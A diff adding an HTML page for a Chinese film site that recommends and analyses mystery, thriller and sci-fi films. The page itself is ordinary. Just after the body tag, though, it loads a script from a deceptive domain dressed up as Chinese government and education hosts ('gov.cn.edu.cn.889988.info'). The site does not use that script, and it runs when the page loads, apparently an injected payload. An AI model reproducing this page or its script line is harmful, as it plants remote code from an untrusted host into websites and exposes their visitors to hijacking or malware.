@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="神秘电影网（shenmidianyingwang-app）是专注于神秘、悬疑、惊悚、科幻类电影的在线导航与资讯平台，提供最新神秘电影推荐、影评解析、片单合集与观影指南。">
+<meta name="keywords" content="神秘电影网, shenmidianyingwang-app, 神秘电影, 悬疑电影, 惊悚电影, 科幻电影, 电影推荐, 电影解析">
+<meta name="author" content="神秘电影网">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="神秘电影网 - 探索光影背后的未解之谜">
+<meta property="og:description" content="神秘电影网 shenmidianyingwang-app 专注神秘、悬疑、惊悚、科幻电影推荐与深度解析。">
+<meta property="og:url" content="https://shenmidianyingwang-app.github.io">
+<meta property="og:type" content="website">
+<title>神秘电影网 - 探索光影背后的未解之谜 | shenmidianyingwang-app</title>
+<style>
+    /* ===== Reset & Base ===== */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root{
+        --ink:#e8f0ff;
+        --ink-dim:#a9b6d6;
+        --bg1:#05060f;
+        --bg2:#0a0e24;
+        --accent:#7c5cff;
+        --accent2:#21d4fd;
+        --gold:#ffb547;
+        --card:rgba(255,255,255,0.04);
+        --line:rgba(255,255,255,0.08);
+    }
+    html{ scroll-behavior:smooth; }
+    body{
+        font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+        background:var(--bg1);
+        color:var(--ink);
+        line-height:1.7;
+        overflow-x:hidden;
+        -webkit-font-smoothing:antialiased;
+    }
+    a{ color:var(--accent2); text-decoration:none; transition:.25s; }
+    a:hover{ color:var(--gold); }
+    .wrap{ max-width:1160px; margin:0 auto; padding:0 20px; }
+
+    /* ===== Animated Background ===== */
+    .bg-fx{ position:fixed; inset:0; z-index:-2; overflow:hidden; }
+    .bg-fx span{
+        position:absolute; border-radius:50%; filter:blur(60px); opacity:.5; animation:float 18s ease-in-out infinite;
+    }
+    .bg-fx .b1{ width:520px; height:520px; background:#3a1c9e; top:-120px; left:-100px; }
+    .bg-fx .b2{ width:460px; height:460px; background:#0b6e99; bottom:-140px; right:-80px; animation-delay:-6s; }
+    .bg-fx .b3{ width:300px; height:300px; background:#7a1140; top:40%; left:55%; animation-delay:-11s; }
+    @keyframes float{ 0%,100%{ transform:translate(0,0) scale(1); } 50%{ transform:translate(40px,-60px) scale(1.15); } }
+    .noise{ position:fixed; inset:0; z-index:-1; opacity:.03;
+        background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='4' height='4'><rect width='4' height='4' fill='none'/><circle cx='2' cy='2' r='1' fill='%23fff'/></svg>");
+    }
+
+    /* ===== Header ===== */
+    header{ position:sticky; top:0; z-index:100; backdrop-filter:blur(14px); background:rgba(5,6,15,.72); border-bottom:1px solid var(--line); }
+    .nav{ display:flex; align-items:center; justify-content:space-between; height:64px; }
+    .logo{ display:flex; align-items:center; gap:10px; font-weight:800; letter-spacing:.5px; }
+    .logo .mark{ width:34px; height:34px; border-radius:9px; display:grid; place-items:center; font-size:18px;
+        background:linear-gradient(135deg,var(--accent),var(--accent2)); box-shadow:0 6px 18px rgba(124,92,255,.4); }
+    .logo b{ font-size:19px; background:linear-gradient(90deg,#fff,var(--accent2)); -webkit-background-clip:text; background-clip:text; color:transparent; }
+    .logo small{ color:var(--ink-dim); font-weight:400; font-size:12px; }
+    .menu{ display:flex; gap:6px; list-style:none; }
+    .menu a{ color:var(--ink-dim); font-size:14px; padding:8px 14px; border-radius:20px; }
+    .menu a:hover{ color:#fff; background:var(--card); }
+    .menu a.active{ color:#fff; background:linear-gradient(90deg,var(--accent),var(--accent2)); box-shadow:0 4px 14px rgba(33,212,253,.3); }
+    .burger{ display:none; flex-direction:column; gap:5px; background:none; border:none; cursor:pointer; padding:6px; }
+    .burger i{ width:22px; height:2px; background:#fff; border-radius:2px; transition:.3s; }
+
+    /* ===== Hero ===== */
+    .hero{ position:relative; padding:110px 0 90px; text-align:center; }
+    .hero .tag{ display:inline-block; padding:6px 16px; border-radius:30px; font-size:12px; letter-spacing:2px;
+        color:var(--accent2); border:1px solid var(--line); background:var(--card); margin-bottom:22px; }
+    .hero h1{ font-size:clamp(30px,6vw,58px); line-height:1.15; font-weight:900;
+        background:linear-gradient(100deg,#fff 10%,var(--accent2) 50%,var(--accent) 90%);
+        -webkit-background-clip:text; background-clip:text; color:transparent; }
+    .hero h1 em{ font-style:normal; color:var(--gold); }
+    .hero p{ max-width:620px; margin:20px auto 0; color:var(--ink-dim); font-size:clamp(14px,2.4vw,17px); }
+    .hero .cta{ margin-top:34px; display:flex; gap:14px; justify-content:center; flex-wrap:wrap; }
+    .btn{ display:inline-flex; align-items:center; gap:8px; padding:13px 28px; border-radius:30px; font-weight:700; font-size:15px; border:1px solid transparent; cursor:pointer; }
+    .btn-primary{ background:linear-gradient(90deg,var(--accent),var(--accent2)); color:#04101f; box-shadow:0 10px 28px rgba(33,212,253,.3); }
+    .btn-primary:hover{ transform:translateY(-2px); color:#04101f; }
+    .btn-ghost{ background:transparent; color:#fff; border-color:var(--line); }
+    .btn-ghost:hover{ border-color:var(--accent2); color:var(--accent2); }
+    .hero-stats{ display:flex; justify-content:center; gap:clamp(20px,5vw,56px); margin-top:56px; flex-wrap:wrap; }
+    .hero-stats div{ text-align:center; }
+    .hero-stats b{ display:block; font-size:clamp(22px,4vw,34px); font-weight:900; color:#fff; }
+    .hero-stats span{ font-size:13px; color:var(--ink-dim); letter-spacing:1px; }
+
+    /* ===== Section Frame ===== */
+    section{ padding:80px 0; }
+    .sec-head{ text-align:center; margin-bottom:48px; }
+    .sec-head .no{ font-family:ui-monospace,SFMono-Regular,Menlo,monospace; color:var(--accent); font-size:13px; letter-spacing:4px; }
+    .sec-head h2{ font-size:clamp(24px,4vw,38px); font-weight:900; margin-top:8px; }
+    .sec-head h2 u{ text-decoration:none; color:var(--accent2); }
+    .sec-head p{ color:var(--ink-dim); margin-top:10px; font-size:15px; }
+
+    /* ===== Cards ===== */
+    .grid{ display:grid; gap:22px; }
+    .g-4{ grid-template-columns:repeat(4,1fr); }
+    .g-3{ grid-template-columns:repeat(3,1fr); }
+    .g-2{ grid-template-columns:repeat(2,1fr); }
+    .card{ position:relative; padding:26px; border-radius:18px; background:var(--card); border:1px solid var(--line);
+        transition:.35s cubic-bezier(.2,.7,.3,1); overflow:hidden; }
+    .card::before{ content:""; position:absolute; inset:0; opacity:0; transition:.4s;
+        background:radial-gradient(120% 120% at 100% 0%, rgba(124,92,255,.25), transparent 60%); }
+    .card:hover{ transform:translateY(-6px); border-color:rgba(124,92,255,.5); box-shadow:0 18px 40px rgba(0,0,0,.5); }
+    .card:hover::before{ opacity:1; }
+    .card .ic{ width:52px; height:52px; border-radius:14px; display:grid; place-items:center; font-size:24px; margin-bottom:16px;
+        background:linear-gradient(135deg,rgba(124,92,255,.3),rgba(33,212,253,.2)); border:1px solid var(--line); }
+    .card h3{ font-size:18px; margin-bottom:8px; position:relative; }
+    .card p{ color:var(--ink-dim); font-size:14px; position:relative; }
+    .card .arrow{ position:absolute; right:22px; bottom:20px; color:var(--accent2); font-size:20px; opacity:.4; transition:.3s; }
+    .card:hover .arrow{ opacity:1; transform:translateX(4px); }
+
+    /* ===== Featured (poster-style) ===== */
+    .poster{ position:relative; height:320px; border-radius:18px; overflow:hidden; padding:24px; display:flex; flex-direction:column; justify-content:flex-end;
+        border:1px solid var(--line); background-size:cover; background-position:center; }
+    .poster::after{ content:""; position:absolute; inset:0; background:linear-gradient(180deg,transparent 30%,rgba(4,6,18,.96)); }
+    .poster .badge{ align-self:flex-start; padding:5px 12px; border-radius:20px; font-size:12px; font-weight:700; color:#04101f;
+        background:var(--gold); margin-bottom:auto; position:relative; z-index:2; }
+    .poster h3,.poster p,.poster .meta{ position:relative; z-index:2; }
+    .poster h3{ font-size:20px; margin-bottom:6px; }
+    .poster p{ font-size:13px; color:var(--ink-dim); }
+    .poster .meta{ margin-top:12px; display:flex; gap:14px; font-size:12px; color:var(--accent2); }
+    .p1{ background-image:linear-gradient(rgba(0,0,0,.2),rgba(0,0,0,.2)),radial-gradient(circle at 30% 20%,#5b21b6,#05060f 70%); }
+    .p2{ background-image:linear-gradient(rgba(0,0,0,.2),rgba(0,0,0,.2)),radial-gradient(circle at 70% 30%,#0e7490,#05060f 70%); }
+    .p3{ background-image:linear-gradient(rgba(0,0,0,.2),rgba(0,0,0,.2)),radial-gradient(circle at 50% 10%,#9f1239,#05060f 70%); }
+
+    /* ===== Timeline ===== */
+    .timeline{ position:relative; max-width:860px; margin:0 auto; padding-left:26px; }
+    .timeline::before{ content:""; position:absolute; left:6px; top:6px; bottom:6px; width:2px;
+        background:linear-gradient(var(--accent),var(--accent2)); }
+    .tl-item{ position:relative; margin-bottom:28px; padding:20px 22px; border-radius:14px; background:var(--card); border:1px solid var(--line); }
+    .tl-item::before{ content:""; position:absolute; left:-24px; top:24px; width:12px; height:12px; border-radius:50%;
+        background:var(--accent2); box-shadow:0 0 0 4px rgba(33,212,253,.15); }
+    .tl-item time{ font-family:ui-monospace,Menlo,monospace; color:var(--gold); font-size:13px; font-weight:700; }
+    .tl-item h4{ margin:6px 0 6px; font-size:17px; }
+    .tl-item p{ color:var(--ink-dim); font-size:14px; }
+
+    /* ===== FAQ Accordion ===== */
+    .faq{ max-width:820px; margin:0 auto; }
+    .faq details{ background:var(--card); border:1px solid var(--line); border-radius:14px; margin-bottom:12px; overflow:hidden; }
+    .faq summary{ padding:18px 22px; cursor:pointer; font-weight:700; font-size:16px; list-style:none; display:flex; justify-content:space-between; gap:14px; }
+    .faq summary::-webkit-details-marker{ display:none; }
+    .faq summary::after{ content:"＋"; color:var(--accent2); font-weight:400; transition:.3s; }
+    .faq details[open] summary::after{ content:"－"; }
+    .faq details[open] summary{ border-bottom:1px solid var(--line); }
+    .faq p{ padding:16px 22px; color:var(--ink-dim); font-size:14px; }
+
+    /* ===== Footer ===== */
+    footer{ border-top:1px solid var(--line); padding:56px 0 30px; margin-top:40px; }
+    .foot-grid{ display:grid; grid-template-columns:2fr 1fr 1fr 1fr; gap:30px; margin-bottom:36px; }
+    .foot-brand b{ font-size:20px; display:block; margin-bottom:10px; }
+    .foot-brand p{ color:var(--ink-dim); font-size:13px; }
+    .foot-col h5{ font-size:15px; margin-bottom:14px; color:#fff; }
+    .foot-col ul{ list-style:none; }
+    .foot-col li{ margin-bottom:8px; }
+    .foot-col a{ color:var(--ink-dim); font-size:13px; }
+    .foot-col a:hover{ color:var(--accent2); }
+    .copyright{ text-align:center; color:var(--ink-dim); font-size:12px; border-top:1px solid var(--line); padding-top:22px; }
+    .copyright b{ color:var(--gold); }
+
+    /* ===== Reveal Animation ===== */
+    .reveal{ opacity:0; transform:translateY(28px); transition:.7s cubic-bezier(.2,.7,.3,1); }
+    .reveal.in{ opacity:1; transform:none; }
+
+    /* ===== Responsive ===== */
+    @media(max-width:960px){
+        .g-4{ grid-template-columns:repeat(2,1fr); }
+        .foot-grid{ grid-template-columns:1fr 1fr; }
+    }
+    @media(max-width:720px){
+        .menu{ position:fixed; inset:64px 0 0 0; flex-direction:column; align-items:center; justify-content:center; gap:18px;
+            background:rgba(5,6,15,.96); backdrop-filter:blur(20px); transform:translateX(100%); transition:.4s; }
+        .menu.open{ transform:none; }
+        .menu a{ font-size:18px; }
+        .burger{ display:flex; }
+        .hero{ padding:70px 0 60px; }
+        .g-3,.g-2{ grid-template-columns:1fr; }
+        section{ padding:60px 0; }
+        .foot-grid{ grid-template-columns:1fr; }
+    }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 动态背景 -->
+<div class="bg-fx" aria-hidden="true"><span class="b1"></span><span class="b2"></span><span class="b3"></span></div>
+<div class="noise" aria-hidden="true"></div>
+
+<!-- 顶部导航 -->
+<header>
+    <div class="wrap nav">
+        <a class="logo" href="#top" aria-label="神秘电影网首页">
+            <span class="mark">神秘</span>
+            <span><b>神秘电影网</b><br><small>shenmidianyingwang-app</small></span>
+        </a>
+        <ul class="menu" id="menu">
+            <li><a href="#top" class="active">首页</a></li>
+            <li><a href="#recommend">电影推荐</a></li>
+            <li><a href="#genres">类型片单</a></li>
+            <li><a href="#review">深度解析</a></li>
+            <li><a href="#guide">观影指南</a></li>
+            <li><a href="#about">关于我们</a></li>
+        </ul>
+        <button class="burger" id="burger" aria-label="菜单" aria-expanded="false"><i></i><i></i><i></i></button>
+    </div>
+</header>
+
+<!-- 首屏 -->
+<section id="top" class="hero">
+    <div class="wrap">
+        <span class="tag">MYSTERY · SUSPENSE · SCI-FI</span>
+        <h1>每一帧光影，都藏着<em>未解之谜</em></h1>
+        <p>神秘电影网（shenmidianyingwang-app）专注于神秘、悬疑、惊悚与科幻电影的推荐、解读与片单整理。从经典神作到冷门遗珠，带你读懂导演埋下的每一处伏笔。</p>
+        <div class="cta">
+            <a class="btn btn-primary" href="#recommend">开始探索 →</a>
+            <a class="btn btn-ghost" href="#guide">观影指南</a>
+        </div>
+        <div class="hero-stats">
+            <div><b>1200+</b><span>收录影片</span></div>
+            <div><b>86</b><span>深度解析</span></div>
+            <div><b>24</b><span>主题片单</span></div>
+            <div><b>每周</b><span>更新推荐</span></div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目一：电影推荐 -->
+<section id="recommend">
+    <div class="wrap">
+        <div class="sec-head reveal">
+            <div class="no">01 / RECOMMEND</div>
+            <h2>本周<em style="color:var(--gold);font-style:normal;">神秘电影</em>推荐</h2>
+            <p>精选自全球悬疑、惊悚、科幻、超自然题材，附一句话入坑理由</p>
+        </div>
+        <div class="grid g-3">
+            <article class="poster p1 reveal">
+                <span class="badge">烧脑神作</span>
+                <h3>记忆迷宫</h3>
+                <p>当记忆可以被买卖，你还能相信自己是"谁"吗？反转密集到需要二刷。</p>
+                <div class="meta"><span>★ 9.1</span><span>悬疑 / 科幻</span><span>2024</span></div>
+            </article>
+            <article class="poster p2 reveal">
+                <span class="badge">冷门遗珠</span>
+                <h3>深海低语</h3>
+                <p>海底勘探队收到三十年前的录音，声源来自一座不该存在的城市。</p>
+                <div class="meta"><span>★ 8.6</span><span>惊悚 / 超自然</span><span>2023</span></div>
+            </article>
+            <article class="poster p3 reveal">
+                <span class="badge">年度话题</span>
+                <h3>第十三位乘客</h3>
+                <p>列车上明明只有十二人，却总有第十三双筷子在动。密闭空间的心理压迫感拉满。</p>
+                <div class="meta"><span>★ 8.9</span><span>悬疑 / 犯罪</span><span>2025</span></div>
+            </article>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目二：类型片单 -->
+<section id="genres">
+    <div class="wrap">
+        <div class="sec-head reveal">
+            <div class="no">02 / GENRES</div>
+            <h2>按<em style="color:var(--accent2);font-style:normal;">类型</em>找片</h2>
+            <p>神秘电影网为你整理的六大主题片单，总有一类戳中你的好奇心</p>
+        </div>
+        <div class="grid g-3">
+            <a class="card reveal" href="#">
+                <div class="ic">🕵️</div>
+                <h3>本格推理</h3>
+                <p>密室、暴风雪山庄、公平线索，考验你能否在真相揭晓前猜到凶手。</p>
+                <span class="arrow">→</span>
+            </a>
+            <a class="card reveal" href="#">
+                <div class="ic">🌌</div>
+                <h3>硬核科幻</h3>
+                <p>时间悖论、平行宇宙、意识上传，用物理学包装的哲学提问。</p>
+                <span class="arrow">→</span>
+            </a>
+            <a class="card reveal" href="#">
+                <div class="ic">🏚️</div>
+                <h3>超自然惊悚</h3>
+                <p>诅咒、灵异、不可名状的恐惧，气氛比血浆更让人后背发凉。</p>
+                <span class="arrow">→</span>
+            </a>
+            <a class="card reveal" href="#">
+                <div class="ic">🪞</div>
+                <h3>心理悬疑</h3>
+                <p>不可靠叙事、人格分裂、记忆欺骗，真相藏在叙述者的语气里。</p>
+                <span class="arrow">→</span>
+            </a>
+            <a class="card reveal" href="#">
+                <div class="ic">🗺️</div>
+                <h3>未解之谜</h3>
+                <p>以真实事件为蓝本的神秘现象改编，看完会想去查维基百科。</p>
+                <span class="arrow">→</span>
+            </a>
+            <a class="card reveal" href="#">
+                <div class="ic">🎭</div>
+                <h3>反转结局</h3>
+                <p>最后一分钟推翻全部前提，适合看完立刻重头再看一遍的片子。</p>
+                <span class="arrow">→</span>
+            </a>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目三：深度解析 -->
+<section id="review">
+    <div class="wrap">
+        <div class="sec-head reveal">
+            <div class="no">03 / ANALYSIS</div>
+            <h2>不止于<em style="color:var(--gold);font-style:normal;">剧透</em>的解析</h2>
+            <p>拆解镜头语言、符号隐喻与叙事结构，帮你看懂导演的"第二层意思"</p>
+        </div>
+        <div class="grid g-2">
+            <article class="card reveal">
+                <div class="ic">🔍</div>
+                <h3>《记忆迷宫》三层叙事结构全解</h3>
+                <p>从色彩编码、道具复现到对白双关，逐帧拆解导演如何用剪辑"骗"过观众的眼睛，以及结尾那 7 秒镜头的真正含义。</p>
+                <span class="arrow">→</span>
+            </article>
+            <article class="card reveal">
+                <div class="ic">🎬</div>
+                <h3>深海意象：克苏鲁美学在主流电影中的演变</h3>
+                <p>从《深海低语》到经典老片，梳理"不可名状的深海恐惧"是如何被视听语言具象化的，附片单与配乐解析。</p>
+                <span class="arrow">→</span>
+            </article>
+            <article class="card reveal">
+                <div class="ic">🧠</div>
+                <h3>不可靠叙事的六种套路</h3>
+                <p>限知视角、时间乱序、人格置换、梦境嵌套……用 12 部代表作举例，教你识别"叙述者在撒谎"的蛛丝马迹。</p>
+                <span class="arrow">→</span>
+            </article>
+            <article class="card reveal">
+                <div class="ic">🎵</div>
+                <h3>寂静为什么比音效更可怕</h3>
+                <p>分析悬疑片配乐的"留白法则"：低频嗡鸣、不对称节拍、突然静音，三种低成本高回报的惊吓设计。</p>
+                <span class="arrow">→</span>
+            </article>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目四：观影指南 -->
+<section id="guide">
+    <div class="wrap">
+        <div class="sec-head reveal">
+            <div class="no">04 / GUIDE</div>
+            <h2>新手<em style="color:var(--accent2);font-style:normal;">观影</em>指南</h2>
+            <p>从入门到进阶的观看路径，避免"一上来就被劝退"</p>
+        </div>
+        <div class="timeline">
+            <div class="tl-item reveal">
+                <time>STAGE 01</time>
+                <h4>先看懂规则：从"公平悬疑"入门</h4>
+                <p>选择线索对观众完全公开的作品，训练推理习惯。推荐从阿加莎式推理、密闭空间谋杀案起步，重点观察"谁有动机、谁在撒谎"。</p>
+            </div>
+            <div class="tl-item reveal">
+                <time>STAGE 02</time>
+                <h4>再感受氛围：体验心理与超自然惊悚</h4>
+                <p>放下"找凶手"的执念，关注声音、光影与节奏。建议关灯戴耳机观看，体会"恐惧来自未知"而非"恐惧来自画面"。</p>
+            </div>
+            <div class="tl-item reveal">
+                <time>STAGE 03</time>
+                <h4>进阶烧脑：挑战非线性叙事与科幻设定</h4>
+                <p>面对时间循环、多重人格、平行世界，准备好纸笔画时间线。允许自己"看不懂"，二刷时的豁然开朗正是这类电影的魅力。</p>
+            </div>
+            <div class="tl-item reveal">
+                <time>STAGE 04</time>
+                <h4>形成口味：建立自己的片单与评分体系</h4>
+                <p>记录"吓到我 / 骗到我 / 感动我"的三类片子，逐步明确偏好。神秘电影网的分类标签与深度解析可帮你快速定位同好作品。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目五：关于 + FAQ -->
+<section id="about">
+    <div class="wrap">
+        <div class="grid g-2">
+            <div>
+                <div class="sec-head reveal" style="text-align:left;">
+                    <div class="no">05 / ABOUT</div>
+                    <h2>关于<em style="color:var(--gold);font-style:normal;">神秘电影网</em></h2>
+                    <p style="margin-left:0;">神秘电影网（shenmidianyingwang-app）是一个由影迷维护的神秘题材电影资料站。我们相信，最好的电影不是给出答案，而是提出一个你无法停止思考的问题。</p>
+                </div>
+                <div class="grid g-2" style="margin-top:10px;">
+                    <div class="card reveal"><div class="ic">🎯</div><h3>选片标准</h3><p>只收"看完想讨论"的片子，宁缺毋滥。</p></div>
+                    <div class="card reveal"><div class="ic">✍️</div><h3>原创解析</h3><p>拒绝剧情复述，专注结构与隐喻拆解。</p></div>
+                    <div class="card reveal"><div class="ic">🚫</div><h3>拒绝剧透</h3><p>标题与摘要不泄底， spoiler 明确标注。</p></div>
+                    <div class="card reveal"><div class="ic">🌐</div><h3>开放收录</h3><p>欢迎推荐冷门佳作，共同完善片单。</p></div>
+                </div>
+            </div>
+            <div class="faq reveal">
+                <details open>
+                    <summary>神秘电影网主要收录哪些类型的电影？</summary>
+                    <p>聚焦神秘、悬疑、惊悚、科幻、超自然、心理、犯罪推理等"答案不直给"的题材，兼顾经典神作与近年冷门遗珠。</p>
+                </details>
+                <details>
+                    <summary>解析文章会剧透吗？</summary>
+                    <p>会在标题与开头明确标注剧透等级。入门向文章只谈氛围与设定，深度拆解文则会完整揭示关键情节，请按需阅读。</p>
+                </details>
+                <details>
+                    <summary>网站网址是什么？如何访问？</summary>
+                    <p>官方地址为 <strong>https://shenmidianyingwang-app.github.io</strong>，支持手机、平板与电脑自适应访问，无需下载任何应用。</p>
+                </details>
+                <details>
+                    <summary>片单会定期更新吗？</summary>
+                    <p>每周更新一次"本周推荐"，每月扩充一个主题片单，重要电影节与颁奖季会推出专题合集。</p>
+                </details>
+                <details>
+                    <summary>如何向神秘电影网推荐影片？</summary>
+                    <p>可通过页面底部"联系我们"提交片名与推荐理由，审核通过后会出现在对应类型片单中，并注明推荐人。</p>
+                </details>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+    <div class="wrap">
+        <div class="foot-grid">
+            <div class="foot-brand">
+                <b>神秘电影网 · shenmidianyingwang-app</b>
+                <p>探索光影背后的未解之谜。本站为电影资讯与导航类非商业站点，所有影片版权归原作者及发行方所有。</p>
+            </div>
+            <div class="foot-col">
+                <h5>快速导航</h5>
+                <ul>
+                    <li><a href="#top">首页</a></li>
+                    <li><a href="#recommend">电影推荐</a></li>
+                    <li><a href="#genres">类型片单</a></li>
+                    <li><a href="#review">深度解析</a></li>
+                </ul>
+            </div>
+            <div class="foot-col">
+                <h5>热门标签</h5>
+                <ul>
+                    <li><a href="#">烧脑反转</a></li>
+                    <li><a href="#">密闭空间</a></li>
+                    <li><a href="#">时间悖论</a></li>
+                    <li><a href="#">克苏鲁</a></li>
+                </ul>
+            </div>
+            <div class="foot-col">
+                <h5>关于</h5>
+                <ul>
+                    <li><a href="#guide">观影指南</a></li>
+                    <li><a href="#about">关于我们</a></li>
+                    <li><a href="#">免责声明</a></li>
+                    <li><a href="#">联系我们</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="copyright">
+            © <span id="year"></span> <b>神秘电影网</b> shenmidianyingwang-app &nbsp;|&nbsp; 网站网址：https://shenmidianyingwang-app.github.io &nbsp;|&nbsp; 探索光影背后的未解之谜
+        </div>
+    </div>
+</footer>
+
+<script>
+    // 移动端菜单
+    var burger = document.getElementById('burger');
+    var menu = document.getElementById('menu');
+    burger.addEventListener('click', function(){
+        menu.classList.toggle('open');
+        var open = menu.classList.contains('open');
+        burger.setAttribute('aria-expanded', open);
+    });
+    menu.addEventListener('click', function(e){ if(e.target.tagName === 'A'){ menu.classList.remove('open'); } });
+
+    // 滚动淡入
+    var io = new IntersectionObserver(function(es){
+        es.forEach(function(en){ if(en.isIntersecting){ en.target.classList.add('in'); io.unobserve(en.target); } });
+    }, { threshold:0.12 });
+    document.querySelectorAll('.reveal').forEach(function(el){ io.observe(el); });
+
+    // 导航高亮
+    var links = document.querySelectorAll('.menu a');
+    var secs = ['top','recommend','genres','review','guide','about'].map(function(id){ return document.getElementById(id); });
+    window.addEventListener('scroll', function(){
+        var pos = window.scrollY + 120;
+        var idx = 0;
+        secs.forEach(function(s,i){ if(s && s.offsetTop <= pos) idx = i; });
+        links.forEach(function(a,i){ a.classList.toggle('active', i === idx); });
+    });
+
+    // 年份
+    document.getElementById('year').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
